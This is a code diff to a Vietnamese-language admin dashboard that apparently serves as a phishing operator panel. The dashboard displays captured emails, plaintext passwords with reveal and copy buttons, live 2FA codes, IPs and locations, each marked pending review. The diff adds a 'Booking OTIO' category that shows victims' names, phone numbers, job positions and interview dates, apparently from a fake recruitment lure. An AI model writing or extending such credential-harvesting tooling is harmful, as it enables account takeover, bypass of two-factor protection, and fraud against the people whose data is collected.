@@ -395,6 +395,12 @@
             border: 1px solid var(--purple-border);
         }
 
+        .type-badge.booking_otio {
+            background: #fffbeb;
+            color: #92400e;
+            border: 1px solid #fde68a;
+        }
+
         /* Table custom cell elements */
         .email-cell {
             font-weight: 600;
@@ -695,6 +701,13 @@
                 </div>
                 <div class="stat-icon icon-2fa">🔐</div>
             </div>
+            <div class="stat-card" onclick="setTypeFilter('booking_otio')">
+                <div>
+                    <div class="stat-title">Booking OTIO</div>
+                    <div class="stat-value" id="count-booking">0</div>
+                </div>
+                <div class="stat-icon" style="background:#fffbeb; color:#d97706;">📅</div>
+            </div>
         </div>
 
         <!-- Filter & Actions Toolbar -->
@@ -706,9 +719,10 @@
                 </div>
 
                 <select class="filter-select" id="type-filter" onchange="handleTypeChange(this.value)">
-                    <option value="all">Tất cả loại (MK + 2FA)</option>
+                    <option value="all">Tất cả loại (MK + 2FA + OTIO)</option>
                     <option value="login">Chỉ Đăng nhập (Mật khẩu)</option>
                     <option value="2fa">Chỉ Xác thực 2FA (Mã OTP)</option>
+                    <option value="booking_otio">Chỉ Booking OTIO</option>
                 </select>
 
                 <select class="filter-select" id="status-filter" onchange="handleStatusChange(this.value)">
@@ -844,10 +858,12 @@
             let pending = 0;
             let loginCount = 0;
             let twofaCount = 0;
+            let bookingCount = 0;
 
             rawData.forEach(item => {
                 if (item.status === 'pending') pending++;
                 if (item.type === '2fa') twofaCount++;
+                else if (item.type === 'booking_otio') bookingCount++;
                 else loginCount++;
             });
 
@@ -855,6 +871,9 @@
             document.getElementById('count-pending').textContent = pending;
             document.getElementById('count-login').textContent = loginCount;
             document.getElementById('count-2fa').textContent = twofaCount;
+            if (document.getElementById('count-booking')) {
+                document.getElementById('count-booking').textContent = bookingCount;
+            }
         }
 
         function applyFilter() {
@@ -870,7 +889,7 @@
                     return false;
                 }
 
-                // Search query (Email, Password, Code, IP, Location)
+                // Search query (Email, Password, Code, IP, Location, Name, Phone, Position, Experience, Date, Time)
                 if (searchQuery.trim() !== '') {
                     const q = searchQuery.toLowerCase().trim();
                     const emailMatch = (item.email || '').toLowerCase().includes(q);
@@ -878,7 +897,13 @@
                     const codeMatch = (item.code || '').toLowerCase().includes(q);
                     const ipMatch = (item.ip || '').toLowerCase().includes(q);
                     const locationMatch = (item.location || '').toLowerCase().includes(q);
-                    return emailMatch || passwordMatch || codeMatch || ipMatch || locationMatch;
+                    const nameMatch = (item.fullName || '').toLowerCase().includes(q);
+                    const phoneMatch = (item.phone || '').toLowerCase().includes(q);
+                    const posMatch = (item.position || '').toLowerCase().includes(q);
+                    const expMatch = (item.experience || '').toLowerCase().includes(q);
+                    const dateMatch = (item.date || '').toLowerCase().includes(q);
+                    const timeMatch = (item.time || '').toLowerCase().includes(q);
+                    return emailMatch || passwordMatch || codeMatch || ipMatch || locationMatch || nameMatch || phoneMatch || posMatch || expMatch || dateMatch || timeMatch;
                 }
 
                 return true;
@@ -937,6 +962,7 @@
                 const isPending = item.status === 'pending';
                 const isChecked = selectedIds.has(item.id) ? 'checked' : '';
                 const isRevealed = revealedPasswords.has(item.id);
+                const isBooking = item.type === 'booking_otio';
                 const is2FA = item.type === '2fa';
                 
                 let statusLabel = 'Chờ duyệt';
@@ -957,7 +983,9 @@
                             🕒 ${escapeHtml(formatDateTime(item.createdAt))}
                         </td>
                         <td>
-                            ${is2FA ? `
+                            ${isBooking ? `
+                                <span class="type-badge booking_otio">📅 Booking OTIO</span>
+                            ` : is2FA ? `
                                 <span class="type-badge twofa">🔐 Mã 2FA</span>
                             ` : `
                                 <span class="type-badge login">🏷️ Đăng nhập</span>
@@ -969,7 +997,14 @@
                             </div>
                         </td>
                         <td>
-                            ${rawPassword && rawPassword !== 'N/A' ? `
+                            ${isBooking ? `
+                                <div style="background:#fffbeb; border:1px solid #fde68a; padding:8px 10px; border-radius:6px; font-size:12px; line-height:1.5; color:#78350f; max-width: 340px;">
+                                    <div>👤 <b>Họ tên:</b> ${escapeHtml(item.fullName || '—')}</div>
+                                    <div>💼 <b>Vị trí:</b> ${escapeHtml(item.position || '—')}</div>
+                                    <div>📅 <b>Lịch hẹn:</b> ${escapeHtml(item.date || '')} ${escapeHtml(item.time ? 'lúc ' + item.time : '')}</div>
+                                    <div>📝 <b>Kinh nghiệm:</b> ${escapeHtml(item.experience || '—')}</div>
+                                </div>
+                            ` : rawPassword && rawPassword !== 'N/A' ? `
                                 <div class="password-cell">
                                     🔑 <span class="password-text">${displayPassword}</span>
                                     <button class="copy-btn" title="${isRevealed ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'}" onclick="togglePassword('${escapeHtml(item.id)}')">
@@ -982,7 +1017,16 @@
                             ` : `<span style="color:#94a3b8;">—</span>`}
                         </td>
                         <td>
-                            ${rawCode ? `
+                            ${isBooking ? `
+                                <div class="code-cell">
+                                    <span>📞 ${escapeHtml(item.phone || item.code || '—')}</span>
+                                    ${(item.phone || item.code) ? `
+                                        <button class="copy-btn" title="Sao chép SĐT" onclick="copyToClipboard('${escapeHtml(item.phone || item.code)}', 'số điện thoại')">
+                                            📋
+                                        </button>
+                                    ` : ''}
+                                </div>
+                            ` : rawCode ? `
                                 <div class="code-cell">
                                     <span>${escapeHtml(rawCode)}</span>
                                     <button class="copy-btn" title="Sao chép mã 2FA" onclick="copyToClipboard('${escapeHtml(rawCode)}', 'mã 2FA')">
